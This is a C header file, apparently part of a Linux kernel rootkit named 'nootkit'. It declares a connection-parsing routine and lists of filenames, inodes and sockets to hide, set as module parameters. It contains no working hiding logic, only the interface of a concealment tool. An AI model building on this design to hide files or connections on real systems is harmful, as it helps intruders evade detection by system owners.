#pragma once

#define MAX_HIDE_ENTITIES 255

enum connection_proto {
    SESSION_TCP = 1,
    SESSION_UDP = 2
};

struct config_connection {
    enum connection_proto proto;
    u32 local_ip;
    u32 local_ip_mask;
    u32 foreign_ip;
    u32 foreign_ip_mask;
    u16 local_port;
    u16 foreign_port;
};

/// @brief Parse a connection description string (e.g. entered as a module parameter)
///     to a config_connection struct.
/// @param cs Connection description string.
/// @param res Pointer to a config_connection struct to fill with data.
/// @return 0 on success, non-zero on error.
int config_parse_connection(char *cs, struct config_connection *res);

/// @brief Fill all config globals which require runtime parsing, e.g. hide_sockets
///     structs being filled from strings.
/// @returns 0 on success, or non-zero if at least one parse failed.
/// @attention In case of failure, config globals are left in an unstable state, and
///     should not be used.
int config_parse_globals(void);

/**
 * Defined in config.c
 */

extern struct config_connection hide_sockets[MAX_HIDE_ENTITIES];

/**
 * Config globals that are defined in nootkit_main.c
 * as module parameters
 */

extern char *hide_filenames[MAX_HIDE_ENTITIES];
extern int hide_filenames_count;

extern unsigned long hide_inodes[MAX_HIDE_ENTITIES];
extern int hide_inodes_count;

extern char *hide_sockets_strs[MAX_HIDE_ENTITIES];
extern int hide_sockets_count;
